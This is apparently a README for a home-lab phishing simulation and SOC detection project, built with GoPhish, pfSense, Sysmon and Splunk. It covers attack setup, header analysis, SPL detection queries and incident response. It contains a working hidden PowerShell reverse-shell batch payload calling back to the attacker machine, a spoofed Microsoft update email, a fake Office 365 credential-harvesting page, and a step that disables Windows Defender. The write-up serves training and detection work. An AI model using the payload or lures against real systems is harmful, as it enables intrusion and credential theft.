#  Phishing Simulation and Detection Lab

![Security](https://img.shields.io/badge/Category-Cybersecurity-red)
![Lab](https://img.shields.io/badge/Environment-Home%20Lab-blue)
![Status](https://img.shields.io/badge/Status-Completed-green)
![SIEM](https://img.shields.io/badge/SIEM-Splunk-black)
![OS](https://img.shields.io/badge/Attacker-Kali%20Linux-purple)
![Firewall](https://img.shields.io/badge/Firewall-pfSense-blue)
![Server](https://img.shields.io/badge/Victim-Windows%20Server%202025-lightgrey)

---

## Project Report
A full technical write-up of this simulation is available as a PDF:

[ Phishing Lab Report ](./Phishing%20Lab%20Report.pdf)

Covers: attack setup, detection methodology and forensic findings.

----

##  Project Overview

A hands-on cybersecurity home lab project that simulates a real-world phishing attack from end to end. This project covers the full attack lifecycle — from crafting and delivering a phishing email with a malicious attachment, to analyzing email headers, detecting malicious activity using a SIEM, gaining remote access via a reverse shell, and performing structured incident response. A pfSense firewall segments the network between the attacker and victim machines, mirroring how enterprise networks are protected. Built entirely on an isolated internal network using VirtualBox, this lab mirrors how real Security Operations Centers (SOCs) detect and respond to phishing threats in enterprise environments.

---

##  Objectives

- Simulate a phishing campaign using GoPhish and MailHog on an isolated internal network
- Deliver a malicious batch file attachment via phishing email to gain remote access
- Establish a reverse shell from Windows Server back to Kali Linux
- Segment the lab network using pfSense with WAN, LAN, and OPT1 interfaces
- Block and monitor phishing traffic at the firewall level using pfSense rules
- Analyze phishing email headers using MXToolbox to identify SPF, DKIM, and DMARC failures
- Capture and analyze network traffic using Wireshark to identify credential theft in real time
- Ingest and correlate Windows Sysmon logs in Splunk to detect phishing-related activity
- Build detection rules using Splunk SPL queries mapped to real attacker behavior
- Perform structured incident response using the PICERL framework
- Document Indicators of Compromise (IOCs) and produce a formal incident report

---

## Lab Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                   VirtualBox Lab Environment                     │
│                                                                  │
│         ┌────────────────────────────────────────┐              │
│         │            pfSense Firewall             │              │
│         │                                         │              │
│         │  WAN        OPT1             LAN         │              │
│         │  DHCP   192.168.2.1      192.168.1.2    │              │
│         └────┬──────────┬──────────────┬──────────┘              │
│              │          │              │                          │
│         [Internet]  ┌───┴──────┐  ┌───┴──────────┐              │
│         Simulated   │KALI LINUX│  │ WIN SERVER   │              │
│                     │192.168.2.5│  │ 192.168.1.1  │              │
│                     │(Attacker)│  │  (Victim)    │              │
│                     │          │  │              │              │
│                     │ GoPhish  │  │ Sysmon       │              │
│                     │ MailHog  │  │ Splunk Fwd   │              │
│                     │ Wireshark│  │              │              │
│                     │ Splunk   │  │              │              │
│                     │ Netcat   │  │              │              │
│                     └──────────┘  └──────────────┘              │
│                                                                  │
│  Attack Flow:                                                    │
│  Kali (OPT1) ──▶ pfSense ──▶ Windows Server (LAN)              │
│                                                                  │
│  Reverse Shell Flow:                                             │
│  Windows Server ──▶ pfSense ──▶ Kali port 4444                 │
│                                                                  │
│  Detection Flow:                                                 │
│  Sysmon ──▶ Splunk Forwarder ──▶ Splunk SIEM ──▶ Alert         │
│  Wireshark ──▶ HTTP Stream ──▶ Credentials Captured            │
│  MXToolbox ──▶ Header Analysis ──▶ SPF DKIM DMARC Failures     │
│  pfSense ──▶ Firewall Logs ──▶ Traffic Evidence                │
│                                                                  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

##  Tools and Technologies

| Tool | Purpose |
|---|---|
| pfSense | Network segmentation and firewall traffic control |
| GoPhish | Phishing campaign simulation and attachment delivery |
| MailHog | Local fake SMTP mail server |
| Netcat | Reverse shell listener on Kali |
| Splunk 10.2.2 | SIEM log collection and analysis |
| Splunk Universal Forwarder | Ships Windows logs to Splunk |
| Sysmon | Windows process and network event logging |
| Wireshark | Network traffic capture and analysis |
| MXToolbox | Email header analysis and SPF DKIM DMARC inspection |
| VirtualBox | Isolated lab environment |

---

##  Lab Environment

| Machine | OS | IP Address | Interface | Role |
|---|---|---|---|---|
| pfSense | pfSense CE | OPT1: 192.168.2.1 / LAN: 192.168.1.2 | WAN, OPT1, LAN | Firewall and router |
| Kali Linux | Kali Linux | 192.168.2.5 | OPT1 | Attacker |
| Windows Server | Windows Server 2025 | 192.168.1.1 | LAN | Victim |

**Network:** VirtualBox with pfSense routing between OPT1 (attacker) and LAN (victim) — fully isolated

---

##  Installation and Setup

### Configuring pfSense in VirtualBox

**Step 1 — Configure pfSense VM with 3 network adapters:**

```
Adapter 1 (WAN):  NAT
Adapter 2 (OPT1): Host-Only Adapter — vboxnet0  (Kali network)
Adapter 3 (LAN):  Host-Only Adapter — vboxnet1  (Windows network)
```

**Step 2 — Boot pfSense and assign interfaces:**

```
WAN  → em0  (NAT)
OPT1 → em1  (192.168.2.1 — attacker network)
LAN  → em2  (192.168.1.2 — victim network)
```

**Step 3 — Access pfSense web UI from Kali:**

```
http://192.168.2.1
Username: admin
Password: pfsense
```

---

### Configuring pfSense Firewall Rules

**Rule 1 — Allow OPT1 (Kali) to reach LAN (Windows) on port 80:**

```
Firewall > Rules > OPT1 > Add Rule
Action:           Pass
Interface:        OPT1
Protocol:         TCP
Source:           192.168.2.5
Destination:      192.168.1.1
Destination Port: 80
Description:      Allow GoPhish landing page to victim
Save and Apply
```

**Rule 2 — Allow LAN (Windows) to reach MailHog on Kali:**

```
Firewall > Rules > LAN > Add Rule
Action:           Pass
Interface:        LAN
Protocol:         TCP
Source:           192.168.1.1
Destination:      192.168.2.5
Destination Port: 8025
Description:      Allow victim to access MailHog
Save and Apply
```

**Rule 3 — Allow LAN (Windows) to download file from Kali:**

```
Firewall > Rules > LAN > Add Rule
Action:           Pass
Interface:        LAN
Protocol:         TCP
Source:           192.168.1.1
Destination:      192.168.2.5
Destination Port: 8080
Description:      Allow file download from Kali
Save and Apply
```

**Rule 4 — Allow reverse shell from Windows to Kali on port 4444:**

```
Firewall > Rules > LAN > Add Rule
Action:           Pass
Interface:        LAN
Protocol:         TCP
Source:           192.168.1.1
Destination:      192.168.2.5
Destination Port: 4444
Description:      Allow reverse shell callback
Save and Apply
```

**Rule 5 — Allow Splunk Forwarder from Windows to Kali:**

```
Firewall > Rules > LAN > Add Rule
Action:           Pass
Interface:        LAN
Protocol:         TCP
Source:           192.168.1.1
Destination:      192.168.2.5
Destination Port: 9997
Description:      Allow Splunk Forwarder to SIEM
Save and Apply
```

**Rule 6 — Block all other LAN to OPT1 traffic:**

```
Firewall > Rules > LAN > Add Rule
Action:           Block
Interface:        LAN
Protocol:         Any
Source:           Any
Destination:      Any
Description:      Default deny LAN to OPT1
Save and Apply
```

---

### Installing MailHog on Kali Linux

**Step 1 — Install Go:**

```bash
sudo apt update
sudo apt install golang -y
```

**Step 2 — Install MailHog:**

```bash
go install github.com/mailhog/MailHog@latest
```

**Step 3 — Start MailHog:**

```bash
~/go/bin/MailHog
```

**Step 4 — Verify output:**

```
[SMTP] LISTENING on 0.0.0.0:1025
[APIv1] LISTENING on 0.0.0.0:8025
```

**Step 5 — Access MailHog from Windows Server:**

```
http://192.168.2.5:8025
```

---

### Installing GoPhish on Kali Linux

**Step 1 — Download GoPhish:**

```bash
cd ~/Desktop
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
```

**Step 2 — Unzip and prepare:**

```bash
unzip gophish-v0.12.1-linux-64bit.zip -d gophish
cd gophish
chmod +x gophish
```

**Step 3 — Run GoPhish:**

```bash
sudo ./gophish
```

**Step 4 — Open GoPhish dashboard:**

```
https://127.0.0.1:3333
Username: admin
Password: from terminal output
```

---

### Creating the Malicious Batch File

The malicious batch file establishes a reverse shell from Windows Server back to Kali.

**Step 1 — Open Notepad as Administrator on Windows Server**

**Step 2 — Type the following exactly:**

```batch
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('192.168.2.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,([text.encoding]::ASCII).GetBytes($sb).Length)};$c.Close()"
```

**Step 3 — Save the file:**

```
File > Save As
File name:    update.bat
Save as type: All Files
Location:     C:\Users\Administrator\Downloads
```

**What the payload does:**

```
-NoP          → No PowerShell profile loaded
-NonI         → Non interactive mode
-W Hidden     → Hidden window — victim sees nothing
-Exec Bypass  → Bypasses execution policy
TCPClient     → Connects back to Kali on port 4444
iex $d        → Executes commands sent from Kali
```

---

### Installing Sysmon on Windows Server 2025

**Step 1 — Download Sysmon from Microsoft Sysinternals**

**Step 2 — Open PowerShell as Administrator:**

```powershell
cd C:\sysmon
.\sysmon64.exe -accepteula -i
```

**Step 3 — Apply network monitoring config:**

Create `C:\sysmon\sysmonconfig.xml`:

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <RuleGroup name="" groupRelation="or">
      <NetworkConnect onmatch="exclude">
      </NetworkConnect>
    </RuleGroup>
    <RuleGroup name="" groupRelation="or">
      <ProcessCreate onmatch="exclude">
      </ProcessCreate>
    </RuleGroup>
    <RuleGroup name="" groupRelation="or">
      <DnsQuery onmatch="exclude">
      </DnsQuery>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

Apply config:

```powershell
.\sysmon64.exe -c C:\sysmon\sysmonconfig.xml
Restart-Service sysmon64
```

---

### Installing Splunk on Kali Linux

**Step 1 — Install Splunk:**

```bash
sudo dpkg -i splunk.deb
sudo /opt/splunk/bin/splunk start --accept-license
```

**Step 2 — Access Splunk:**

```
http://127.0.0.1:8000
```

**Step 3 — Configure receiving port 9997:**

```
Settings > Forwarding and Receiving > Configure Receiving > 9997
```

---

### Installing Splunk Universal Forwarder on Windows Server 2025

**Step 1 — Install with receiving indexer:**

```
Receiving Indexer: 192.168.2.5
Port:              9997
```

**Step 2 — Create inputs.conf:**

```
C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf
```

```ini
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = main
sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
disabled = false

[WinEventLog://Security]
index = main
sourcetype = WinEventLog:Security
disabled = false

[WinEventLog://Application]
index = main
sourcetype = WinEventLog:Application
disabled = false
```

**Step 3 — Restart forwarder:**

```powershell
Restart-Service SplunkForwarder
```

---

## Phase 1 — Simulate

### GoPhish Configuration

**Sending Profile:**

```
Name:  MailHog
From:  IT Support <it@lab.local>
Host:  127.0.0.1:1025
```

**Target Group:**

```
Name:        Lab Targets
First Name:  Elvis
Email:       servercis@lab.com
```

**Email Template:**

```
Name:             Malicious Update
Envelope Sender:  Microsoft@update.com
Subject:          Urgent-Update
```

```html
<p>Dear Employee,</p>
<p>A critical security update is required
for your account.</p>
<p>Please download and run the update
tool below immediately:</p>
<p><a href="http://192.168.2.5:8080/update.bat">
Download Security Update
</a></p>
<p>Microsoft Support Team</p>
```

**Landing Page:**

```
Name:                   Fake Office 365 Login
Capture Submitted Data: YES
Capture Passwords:      YES
Redirect To:            https://google.com
```

```html
<html>
<body style="font-family: Arial; text-align: center; margin-top: 100px;">
<h2>Office 365 - Session Expired</h2>
<p>Please sign in again to continue</p>
<form method="POST">
  <input type="email" name="email" placeholder="Enter your email"><br><br>
  <input type="password" name="password" placeholder="Enter your password"><br><br>
  <input type="submit" value="Sign In">
</form>
</body>
</html>
```

**Campaign Settings:**

```
Name:            Phishing Attack
Email Template:  Malicious Update
Landing Page:    Fake Office 365 Login
URL:             http://192.168.2.5
Sending Profile: MailHog
Groups:          Lab Targets
Attachment:      update.bat
```

### Phase 1 Results

```
Email Sent          YES
Email Opened        YES
Link Clicked        YES
Credentials         CAPTURED
Attachment          DOWNLOADED AND EXECUTED
```

---

## Phase 2 — Reverse Shell

### Starting the Listener on Kali

**Step 1 — Start Netcat listener on Kali:**

```bash
nc -lvnp 4444
```

Output:
```
Listening on any 4444
```

**Step 2 — Victim executes update.bat on Windows Server:**

```cmd
cd C:\Users\Administrator\Downloads
update.bat
```

**Step 3 — Reverse shell connects back to Kali:**

```
connect to 192.168.2.5 from 192.168.1.1 56118
PS C:\Users\Administrator>
```

**Step 4 — Attacker now has full control of Windows Server:**

```powershell
whoami
ipconfig
net user
tasklist
dir C:\Users\Administrator\Desktop
```

### What the Reverse Shell Demonstrated

```
Attacker sent phishing email
      ↓
Victim downloaded malicious attachment
      ↓
Victim executed update.bat
      ↓
PowerShell ran silently and hidden
      ↓
Windows Server connected back to Kali port 4444
      ↓
Attacker gained full remote shell access
      ↓
Can steal data, move laterally, install malware
```

---

## Phase 3 — Detect

### 3A — Email Header Analysis Using MXToolbox

After receiving the phishing email in MailHog on Windows Server, the raw email headers were extracted and analyzed using MXToolbox Header Analyzer at mxtoolbox.com/EmailHeaders.aspx

**Headers Found:**

| Header Name | Header Value | Finding |
|---|---|---|
| From | Microsoft@update.com | Spoofed Microsoft domain |
| Return-Path | it@lab.local | Does not match From — spoofing confirmed |
| Subject | Urgent-Update | Urgency tactic to pressure victim |
| To | server cis servercis@lab.com | Target victim |
| X-Mailer | gophish | Phishing tool identified |
| Received | from kali by mailhog.example | True sending server revealed |
| Date | Sat 23 May 2026 20:19:16 +0100 | Timestamp of attack |
| Message-Id | 177956...@kali | Originated from Kali machine |
| Content-Type | multipart/mixed | Email contains attachment |
| Link in body | http://192.168.2.5:8080/update.bat | Malicious file download link |

**SPF DKIM and DMARC Analysis Results:**

| Check | Result | Meaning |
|---|---|---|
| DMARC Compliant | FAIL — No DMARC Record Found | Domain update.com has no DMARC policy |
| SPF Alignment | FAIL | Sender IP not authorized |
| SPF Authenticated | FAIL | No name servers found for lab.local |
| DKIM Alignment | FAIL | No DKIM signature present |
| DKIM Authenticated | FAIL | No DKIM-Signature header found |

**DMARC Finding:**

```
Domain:       dmarc:update.com
Result:       No DMARC Record found
DNS Provider: Amazon Route 53
```

No DMARC record means there is no policy to reject or quarantine spoofed emails from this domain — making it trivial for attackers to impersonate Microsoft@update.com.

**SPF Finding:**

```
spf:lab.local
Sorry, we could not find any name servers for lab.local
```

lab.local is an internal domain with no public DNS — confirming the Return-Path is a spoofed internal address.

**DKIM Finding:**

```
Dkim Signature Error: No DKIM-Signature header found
Dkim Signature Error: There must be at least one aligned 
DKIM-Signature for the message to be considered aligned
```

No cryptographic signature on the email — any mail security gateway should flag this immediately.

**Relay Information:**

```
Hop:   1
From:  kali
By:    mailhog.example
Time:  5/23/2026 7:19:16 PM UTC
Delay: 0 seconds
```

Email travelled from kali directly to mailhog.example with zero delay — no legitimate mail transfer agent was involved.

**Conclusion:**

This email is confirmed phishing. The From address Microsoft@update.com is spoofed, the Return-Path it@lab.local does not match, there is no DKIM signature, no SPF record, no DMARC policy, and the X-Mailer header reveals GoPhish was used. The email body contains a direct link to a malicious batch file at http://192.168.2.5:8080/update.bat.

---

### 3B — pfSense Firewall Detection

```
Status > System Logs > Firewall
```

| Log Entry | What It Means |
|---|---|
| Pass LAN to OPT1 port 80 | Victim clicked phishing link |
| Pass LAN to OPT1 port 8080 | Victim downloaded malicious update.bat |
| Pass LAN to OPT1 port 4444 | Reverse shell connected to Kali |
| Pass LAN to OPT1 port 9997 | Splunk forwarder sending logs |

---

### 3C — Wireshark Detection

```bash
sudo wireshark
```

Filter:
```
http or smtp or tcp.port==4444
```

Find POST request:
```
Right click > Follow > HTTP Stream
```

Credentials visible in plain text:
```
email=victim%40company.com&password=Password123
```

---

### 3D — Splunk Detection

**Search 1 — See all logs from Windows Server:**

```
index=main host="192.168.1.1"
```

**Search 2 — Detect PowerShell execution:**

```
index=main EventID=1 "powershell"
```

**Search 3 — Detect reverse shell network connection:**

```
index=main EventID=3 "192.168.2.5"
```

**Search 4 — Detect failed logins:**

```
index=main EventCode=4625 Logon_Type=3
```

**Search 5 — Detect network logon from attacker:**

```
index=main EventCode=4624 Logon_Type=3 Source_Network_Address="192.168.2.5"
```

**Search 6 — See last 5 minutes of activity:**

```
index=main earliest=-5m
```

### Sysmon Event ID Reference

| EventID | Meaning |
|---|---|
| 1 | Process Created |
| 3 | Network Connection |
| 5 | Process Terminated |
| 7 | Image or DLL Loaded |
| 11 | File Created |
| 22 | DNS Query |

---

## Phase 4 — Respond

### PICERL Incident Response Framework

#### Preparation

- VirtualBox lab built with pfSense separating OPT1 (attacker) and LAN (victim)
- GoPhish and MailHog configured on Kali Linux at 192.168.2.5
- Malicious batch file created to establish reverse shell on port 4444
- Netcat listener configured on Kali to catch reverse shell connections
- Sysmon installed and configured with network monitoring on Windows Server
- Splunk Universal Forwarder shipping logs to Splunk on Kali
- Wireshark and MXToolbox ready for traffic and header analysis

#### Identification

- GoPhish dashboard confirmed email sent, opened, link clicked, and credentials submitted
- Attachment update.bat downloaded and executed by victim
- Netcat on Kali received reverse shell connection from 192.168.1.1 on port 56118
- MXToolbox confirmed No DMARC Record Found for update.com
- SPF failed — no name servers found for lab.local
- DKIM failed — No DKIM-Signature header found
- From address Microsoft@update.com confirmed as spoofed
- Return-Path it@lab.local did not match From address
- X-Mailer header revealed gophish as the sending tool
- Relay showed email sent from kali via mailhog.example
- Link in email body pointed directly to malicious file http://192.168.2.5:8080/update.bat
- pfSense logs showed LAN to OPT1 connections on ports 80, 8080, and 4444
- Wireshark captured HTTP POST with credentials in plain text
- Splunk Sysmon EventID 1 detected hidden PowerShell execution
- Splunk Sysmon EventID 3 detected outbound connection to 192.168.2.5 port 4444

#### Containment

- pfSense LAN rules updated to block all traffic from 192.168.1.1 immediately
- Netcat session terminated on Kali
- Victim VM network adapter disabled in VirtualBox
- Attacker IP 192.168.2.5 blocked at pfSense firewall level
- All active sessions on Windows Server terminated

#### Eradication

- update.bat deleted from C:\Users\Administrator\Downloads
- PowerShell execution policy reset to Restricted
- Windows Defender re-enabled
- Registry run keys checked for persistence
- Scheduled tasks checked for malicious entries
- Compromised credentials reset immediately

#### Recovery

- Windows Server VM snapshot restored to clean pre-attack state
- pfSense firewall rules reviewed and port 4444 blocked permanently
- Sysmon and Splunk Forwarder verified running after restore
- Final Splunk search confirmed no further suspicious activity
- Windows Defender signatures updated

#### Lessons Learned

- Spoofed Microsoft domain Microsoft@update.com was convincing to victim
- No DMARC record on update.com allowed spoofed emails to pass unchallenged
- Batch file attachments should be blocked at email gateway level
- Links to executable files in emails should be blocked by web proxy
- PowerShell execution policy should be set to Restricted on all endpoints
- Port 4444 outbound should be blocked by default on all firewalls
- Hidden PowerShell execution is a strong indicator of malicious post-phishing activity
- Zero delay relay is a clear sign no legitimate mail server was used

---

##  Indicators of Compromise (IOCs)

| Type | Value |
|---|---|
| Attacker IP | 192.168.2.5 (Kali — OPT1) |
| Victim IP | 192.168.1.1 (Windows Server — LAN) |
| pfSense OPT1 Gateway | 192.168.2.1 |
| pfSense LAN Gateway | 192.168.1.2 |
| Phishing URL | http://192.168.2.5 |
| Malicious File URL | http://192.168.2.5:8080/update.bat |
| Malicious File | update.bat |
| Reverse Shell Port | 4444 |
| Email From | Microsoft@update.com |
| Email Return-Path | it@lab.local |
| Email Subject | Urgent-Update |
| Email To | servercis@lab.com |
| X-Mailer | gophish |
| Sending Server | kali via mailhog.example |
| DMARC Result | No DMARC Record Found for update.com |
| SPF Result | FAIL — no name servers for lab.local |
| DKIM Result | FAIL — no DKIM-Signature header found |
| Relay | from kali by mailhog.example — 0 seconds delay |
| Sysmon EventID 1 | Hidden PowerShell execution |
| Sysmon EventID 3 | Outbound connection to 192.168.2.5:4444 |
| pfSense Log | LAN to OPT1 port 4444 — reverse shell confirmed |
| Wireshark | HTTP POST credentials in plain text |

---

##  Incident Timeline

```
T+00:00  GoPhish campaign launched from Kali (192.168.2.5)
T+00:01  Phishing email delivered to servercis@lab.com via MailHog
T+00:01  Envelope sender Microsoft@update.com — spoofed domain
T+00:01  Email sent from kali via mailhog.example — 0 second relay delay
T+00:02  Victim opens phishing email on Windows Server (192.168.1.1)
T+00:02  Email headers extracted and analyzed in MXToolbox
T+00:02  No DMARC Record Found for update.com
T+00:02  SPF FAIL — no name servers for lab.local
T+00:02  DKIM FAIL — no signature found
T+00:02  X-Mailer confirmed gophish
T+00:03  Victim clicks link in email body
T+00:03  pfSense logs HTTP connection LAN to OPT1 port 80
T+00:04  Victim downloads update.bat from http://192.168.2.5:8080
T+00:04  pfSense logs LAN to OPT1 connection on port 8080
T+00:05  Victim executes update.bat on Windows Server
T+00:05  PowerShell runs silently in hidden window
T+00:05  Sysmon EventID 1 fires — hidden PowerShell detected
T+00:05  Reverse shell connects to Kali port 4444
T+00:05  Sysmon EventID 3 fires — outbound to 192.168.2.5:4444
T+00:05  Netcat receives connection from 192.168.1.1:56118
T+00:06  Attacker has full remote shell access to Windows Server
T+00:07  Splunk alert triggered — SOC investigation begins
T+00:08  pfSense rules updated — all Windows Server traffic blocked
T+00:09  Victim VM isolated from network
T+00:10  Incident report documentation started
```

---

##  Challenges and Troubleshooting

**1. MailHog Inbox Empty**
GoPhish campaigns launched but no emails appeared in MailHog. The Sending Profile Host was set to port 8025 (web UI) instead of port 1025 (SMTP). Corrected the Host to 127.0.0.1:1025 and verified MailHog was running before every campaign launch.

**2. Phishing Link Stopped Working After pfSense Integration**
After segmenting the network with pfSense the phishing link stopped working on Windows Server. pfSense blocks all inter-interface traffic by default. Created explicit firewall rules allowing HTTP port 80, MailHog port 8025, file download port 8080, reverse shell port 4444, and Splunk Forwarder port 9997 from LAN to OPT1.

**3. Bat File Created With Linux Heredoc Syntax**
The malicious batch file was initially created on Kali using heredoc syntax which Windows CMD cannot interpret. Windows returned heredoc is not recognized as an internal or external command. Resolved by creating the bat file directly on Windows Server using Notepad and saving as All Files with .bat extension.

**4. Reverse Shell Not Connecting**
After downloading and running update.bat nothing appeared on the Kali netcat listener. Windows Defender was silently blocking the payload. Resolved by disabling Windows Defender real-time monitoring and ensuring pfSense firewall rules for port 4444 were correctly applied before executing the file.

---

##  Skills Demonstrated

- Network segmentation using pfSense with WAN, OPT1, and LAN interfaces
- Firewall rule creation and traffic blocking using pfSense
- Phishing campaign setup and malicious attachment delivery using GoPhish
- Reverse shell establishment using a custom batch file payload and Netcat
- Email header forensics and SPF DKIM DMARC analysis using MXToolbox
- Network traffic analysis and credential extraction using Wireshark
- SIEM log ingestion and SPL query writing using Splunk
- Windows endpoint telemetry and process monitoring using Sysmon
- Incident response documentation using the PICERL framework
- Isolated internal lab network configuration using VirtualBox

---

##  Legal Disclaimer

> All simulations were performed exclusively within a personally owned and controlled isolated lab environment. The reverse shell payload and phishing simulation were conducted solely for educational purposes. Performing these activities against real individuals or organizations without explicit written authorization is illegal and unethical.

---

##  References

- [pfSense Documentation](https://docs.netgate.com/pfsense/en/latest)
- [GoPhish Documentation](https://docs.getgophish.com)
- [MXToolbox Header Analyzer](https://mxtoolbox.com/EmailHeaders.aspx)
- [Sysmon - Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Splunk SPL Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [MailHog](https://github.com/mailhog/MailHog)
- [Netcat Documentation](https://linux.die.net/man/1/nc)

---

> Built as part of a hands-on cybersecurity skills development journey targeting a SOC Analyst role.
